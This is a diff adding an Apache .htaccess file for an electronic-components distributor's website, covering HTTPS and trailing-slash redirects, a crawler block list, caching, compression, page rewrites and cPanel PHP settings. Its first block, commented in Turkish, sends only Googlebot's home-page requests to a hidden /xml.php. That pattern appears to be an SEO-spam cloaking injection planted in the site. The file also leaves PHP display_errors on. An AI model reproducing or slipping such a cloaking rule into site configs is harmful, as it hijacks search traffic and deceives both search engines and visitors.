@@ -1,0 +1,192 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+# Google botları yakala
+
+# Sadece ana dizin veya index.php
+
+# xml.php çalıştır
+RewriteCond %{HTTP_USER_AGENT} Google [NC]
+RewriteCond %{REQUEST_URI} ^/$ [OR]
+RewriteCond %{REQUEST_URI} ^/index\.php$ [NC]
+RewriteRule ^(index\.php)?$ /xml.php [L]
+</IfModule>
+RewriteEngine on 
+
+RewriteCond %{HTTPS} off
+RewriteCond %{HTTP_HOST} !^(localhost|127\.0\.0\.1)(:[0-9]+)?$ [NC]
+RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
+
+#TM Block Bots
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} ^.*(SeznamBot|SemrushBot|AhrefsBot|MJ12bot|PetalBot|DotBot|AwarioBot|ClaudeBot|YandexBot|GPTBot|DataForSeoBot|Amazonbot|Applebot|MojeekBot|BLEXBot|Bytespider|Orbbot|OAI-SearchBot|Barkrowler|spider).*$ [NC]
+RewriteRule .* - [F,L]
+#END TM Block Bots
+
+## Remove trailing slash
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{HTTP_HOST} !^(localhost|127\.0\.0\.1)(:[0-9]+)?$ [NC]
+RewriteRule ^(.*)/$ https://www.intransittech.com/$1 [L,R=301]
+
+RewriteRule ^admin/.*$ - [PT]
+
+RewriteRule ^design/.*$ - [PT]
+
+RewriteRule ^(css|images|uploadimages|js|includes|fonts|design)$ $1/
+
+RewriteRule ^.+/(cache|css|images|uploadimages|js|includes|fonts|design)/(.+)$ $1/$2
+
+#Top Links
+
+ErrorDocument 404 /index.php
+ErrorDocument 500 /index.php
+
+## EXPIRES CACHING ##
+<filesMatch '\.(ico|pdf|flv|jpg|jpeg|png|gif|css|js|doc|woff)$'>
+Header set Cache-Control 'max-age=29030400, public'
+</filesMatch>
+
+<IfModule mod_expires.c>
+ExpiresByType text/css "access plus 1 month"
+ExpiresByType text/javascript "access plus 1 month"
+ExpiresByType application/javascript "access plus 1 month"
+
+ExpiresByType image/jpeg "access plus 1 year"
+ExpiresByType image/gif "access plus 1 year"
+ExpiresByType image/png "access plus 1 year"
+ExpiresByType image/webp "access plus 1 year"
+ExpiresByType image/svg+xml "access plus 1 year"
+ExpiresByType image/x-icon "access plus 1 year"
+
+ExpiresByType font/ttf "access plus 1 year"
+ExpiresByType font/otf "access plus 1 year"
+ExpiresByType font/woff "access plus 1 year"
+ExpiresByType font/woff2 "access plus 1 year"
+ExpiresByType application/font-woff "access plus 1 year"
+</IfModule>
+
+<IfModule mod_filter.c>
+  <IfModule mod_deflate.c>
+    # Compress text, HTML, CSS, JavaScript, XML, and fonts.
+    AddOutputFilterByType DEFLATE text/plain text/html text/xml text/css
+    AddOutputFilterByType DEFLATE application/xml application/xhtml+xml application/rss+xml
+    AddOutputFilterByType DEFLATE application/javascript application/x-javascript
+  </IfModule>
+</IfModule>
+
+<IfModule mod_filter.c>
+<IfModule mod_deflate.c>
+  # Compress HTML, CSS, JavaScript, Text, XML and fonts
+  AddOutputFilterByType DEFLATE application/javascript
+  AddOutputFilterByType DEFLATE application/rss+xml
+  AddOutputFilterByType DEFLATE application/vnd.ms-fontobject
+  AddOutputFilterByType DEFLATE application/x-font
+  AddOutputFilterByType DEFLATE application/x-font-opentype
+  AddOutputFilterByType DEFLATE application/x-font-otf
+  AddOutputFilterByType DEFLATE application/x-font-truetype
+  AddOutputFilterByType DEFLATE application/x-font-ttf
+  AddOutputFilterByType DEFLATE application/x-javascript
+  AddOutputFilterByType DEFLATE application/xhtml+xml
+  AddOutputFilterByType DEFLATE application/xml
+  AddOutputFilterByType DEFLATE font/opentype
+  AddOutputFilterByType DEFLATE font/otf
+  AddOutputFilterByType DEFLATE font/ttf
+  AddOutputFilterByType DEFLATE image/svg+xml
+  AddOutputFilterByType DEFLATE image/x-icon
+  AddOutputFilterByType DEFLATE text/css
+  AddOutputFilterByType DEFLATE text/html
+  AddOutputFilterByType DEFLATE text/javascript
+  AddOutputFilterByType DEFLATE text/plain
+  AddOutputFilterByType DEFLATE text/xml
+
+  # Remove browser bugs (only needed for really old browsers)
+  BrowserMatch ^Mozilla/4 gzip-only-text/html
+  BrowserMatch ^Mozilla/4\.0[678] no-gzip
+  BrowserMatch \bMSIE !no-gzip !gzip-only-text/html
+  Header append Vary User-Agent
+</IfModule>
+</IfModule>
+
+## EXPIRES CACHING ##
+
+RewriteRule ^about$ about.php [QSA]
+RewriteRule ^quality$ quality.php [QSA]
+RewriteRule ^line-card$ line-card.php [QSA]
+RewriteRule ^sell-excess-inventary$ sell-excess-inventary.php [QSA]
+RewriteRule ^news$ news.php [QSA]
+RewriteRule ^parts-search$ parts-search.php [QSA]
+RewriteRule ^product_([^/]+)_([^/]+)$ product-detail.php?pr=$1&id=$2 [QSA]
+RewriteRule ^request-quote$ request-quote.php [QSA]
+RewriteRule ^news1$ news-detail.php?id=1 [QSA]
+RewriteRule ^news2$ news-detail.php?id=2 [QSA]
+RewriteRule ^my-news$ news-detail.php?id=3 [QSA]
+RewriteRule ^services$ services.php [QSA]
+RewriteRule ^global-sourcing$ services-detail.php?id=7 [QSA]
+RewriteRule ^counterfeit-screening$ services-detail.php?id=8 [QSA]
+RewriteRule ^sell-us-your-excess-inventory$ services-detail.php?id=9 [QSA]
+RewriteRule ^rohs-conversion-services$ services-detail.php?id=29 [QSA]
+RewriteRule ^leaded-conversion-services$ services-detail.php?id=30 [QSA]
+RewriteRule ^bga-reballing-bga-repairing-services$ services-detail.php?id=31 [QSA]
+RewriteRule ^component-harvesting-services$ services-detail.php?id=32 [QSA]
+RewriteRule ^cross-reference-specialist$ services-detail.php?id=33 [QSA]
+RewriteRule ^obsolete-hard-to-find-specialist$ services-detail.php?id=34 [QSA]
+RewriteRule ^tape-reeling-services-lead-forming$ services-detail.php?id=35 [QSA]
+RewriteRule ^industries$ industries.php [QSA]
+RewriteRule ^privacy-policy$ privacypolicy.php [QSA]
+RewriteRule ^terms-conditions$ termsconditions.php [QSA]
+RewriteRule ^contact$ contact-us.php [QSA]
+RewriteRule ^scheduled-deliveries$ page.php?id=8 [QSA]
+RewriteRule ^weee-compliance-statement$ page.php?id=7 [QSA]
+RewriteRule ^over-10-million-data-sheets$ page.php?id=6 [QSA]
+RewriteRule ^shipping-policy$ page.php?id=5 [QSA]
+RewriteRule ^component-testing-mil-spec-screening$ page.php?id=4 [QSA]
+RewriteRule ^faq$ page.php?id=2 [QSA]
+RewriteRule ^iso-certificate$ page.php?id=1 [QSA]
+RewriteRule ^manufacturer-([^/]+)$ manufacturer.php?m=$1 [QSA]
+RewriteCond %{HTTP_HOST} ^intransittech\.com$ [OR]
+RewriteCond %{HTTP_HOST} ^www\.intransittech\.com$
+RewriteRule ^about\-us$ "https\:\/\/intransittech\.com\/about" [R=301,L]
+RewriteCond %{HTTP_HOST} ^intransittech\.com$ [OR]
+RewriteCond %{HTTP_HOST} ^www\.intransittech\.com$
+RewriteRule ^contact\-us$ "https\:\/\/intransittech\.com\/contact" [R=301,L]
+RewriteCond %{HTTP_HOST} ^intransittech\.com$ [OR]
+RewriteCond %{HTTP_HOST} ^www\.intransittech\.com$
+RewriteRule ^index$ "https\:\/\/intransittech\.com\/" [R=301,L]
+
+
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “ea-php74” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php74 .php .php7 .phtml
+</IfModule>
+# php -- END cPanel-generated handler, do not edit
+
+# BEGIN cPanel-generated php ini directives, do not edit
+# Manual editing of this file may result in unexpected behavior.
+# To make changes to this file, use the cPanel MultiPHP INI Editor (Home >> Software >> MultiPHP INI Editor)
+# For more information, read our documentation (https://go.cpanel.net/EA4ModifyINI)
+<IfModule php7_module>
+   php_flag display_errors On
+   php_value max_execution_time 90
+   php_value max_input_time 180
+   php_value max_input_vars 4000
+   php_value memory_limit 512M
+   php_value post_max_size 128M
+   php_value session.gc_maxlifetime 14400
+   php_value session.save_path "/var/cpanel/php/sessions/ea-php74"
+   php_value upload_max_filesize 512M
+   php_flag zlib.output_compression On
+</IfModule>
+<IfModule lsapi_module>
+   php_flag display_errors On
+   php_value max_execution_time 90
+   php_value max_input_time 180
+   php_value max_input_vars 4000
+   php_value memory_limit 512M
+   php_value post_max_size 128M
+   php_value session.gc_maxlifetime 14400
+   php_value session.save_path "/var/cpanel/php/sessions/ea-php74"
+   php_value upload_max_filesize 512M
+   php_flag zlib.output_compression On
+</IfModule>
+# END cPanel-generated php ini directives, do not edit
